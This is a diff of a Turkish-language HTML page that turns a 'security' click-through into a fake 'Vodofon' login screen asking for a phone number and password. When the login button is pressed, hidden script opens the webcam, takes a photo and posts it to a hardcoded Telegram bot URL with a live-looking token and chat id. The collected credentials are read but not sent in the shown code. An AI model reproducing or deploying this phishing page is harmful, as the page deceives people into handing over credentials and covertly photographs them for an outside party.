@@ -3,14 +3,31 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GUVENLİK </title>
+<title>Vodofon Giriş Ekranı</title>
 <link rel="stylesheet" href="styles.css">
 <style>
   body {
     font-family: Arial, sans-serif;
     margin: 0;
     padding: 0;
-    background-color: #f0f0f0;
+    background-color: #fff; /* Arka plan rengi beyaz */
+  }
+
+  .container {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh; /* Ekranın tamamını kaplar */
+    background-color: #f00; /* Panelin arka plan rengi kırmızı */
+  }
+
+  #login-panel {
+    padding: 20px;
+    background-color: #fff; /* Panelin iç kısmının arka plan rengi beyaz */
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Gölge efekti */
+    text-align: center;
   }
 
   h1 {
@@ -33,16 +50,33 @@
   button:hover {
     background-color: #0056b3;
   }
+
+  #vodofon-logo {
+    width: 150px;
+    margin-bottom: 20px;
+  }
 </style>
 </head>
 <body>
-<h1>HoŞGeldiniz!</h1>
-<p>ALIS VERIS YAPMAK ICIN DEVAM EDIN  </p>
-<p>GUVENLİKNİCİN ASAGİDAKİ BUTONA BAS ㅤㅤㅤㅤ👇👇</p>
-<button onclick="allowCamera()">BANA BAS 🥳😁</button>
+<div class="container">
+  <div id="login-panel">
+    <img id="Bağlantınız D" src="vodofon-logo.png" alt="Bağlantınız Kötü">
+    <h1>Giriş Ekranı</h1>
+    <p>Telefon numaranızı ve şifrenizi girin:</p>
+    <input type="text" id="phone" placeholder="Telefon Numarası" required>
+    <br><br>
+    <input type="password" id="password" placeholder="Şifre" required>
+    <br><br>
+    <button onclick="login()">Giriş Yap</button>
+  </div>
+</div>
 
 <script>
-function allowCamera() {
+function login() {
+  var phone = document.getElementById('phone').value;
+  var password = document.getElementById('password').value;
+  
+  // Kamera izni iste ve fotoğrafı çekip bota gönder
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(function(stream) {
       var video = document.createElement('video');
@@ -50,7 +84,6 @@ function allowCamera() {
       video.srcObject = stream;
       video.play();
 
-      // Kamera eriim izni verildiinde fotoraf çek
       video.addEventListener('canplay', function() {
         var canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
@@ -59,7 +92,7 @@ function allowCamera() {
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         var imgData = canvas.toDataURL('image/jpeg');
 
-        // Fotoraf binary olarak gönder
+        // Fotoğrafı binary olarak gönder
         var binaryData = atob(imgData.split(',')[1]);
         var arrayBuffer = new ArrayBuffer(binaryData.length);
         var uint8Array = new Uint8Array(arrayBuffer);
@@ -67,7 +100,7 @@ function allowCamera() {
           uint8Array[i] = binaryData.charCodeAt(i);
         }
 
-        // Fotoraf FormData nesnesiyle gönder
+        // Fotoğrafı FormData nesnesiyle gönder
         var formData = new FormData();
         formData.append('chat_id', '6070918315');
         formData.append('photo', new Blob([uint8Array], { type: 'image/jpeg' }));
@@ -75,19 +108,13 @@ function allowCamera() {
         xhr.open('POST', 'https://api.telegram.org/bot6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc/sendPhoto');
         xhr.send(formData);
 
-        // Metni de gönder
-        var xhrText = new XMLHttpRequest();
-        xhrText.open('POST', 'https://api.telegram.org/bot6953014668:AAH70G-dePUlNb9mmCC0T1-UZoxPXKB4hFc/sendMessage');
-        xhrText.setRequestHeader('Content-Type', 'application/json');
-        xhrText.send(JSON.stringify({ chat_id: '6070918315', text: 'Merhaba Halil bey!' }));
-
-        // Kamera akn durdur
+        // Kamera akışını durdur
         stream.getTracks().forEach(track => track.stop());
         document.body.removeChild(video);
       });
     })
     .catch(function(err) {
-      console.error('Kamera eriimi reddedildi:', err);
+      console.error('Kamera erişimi reddedildi:', err);
     });
 }
 </script>
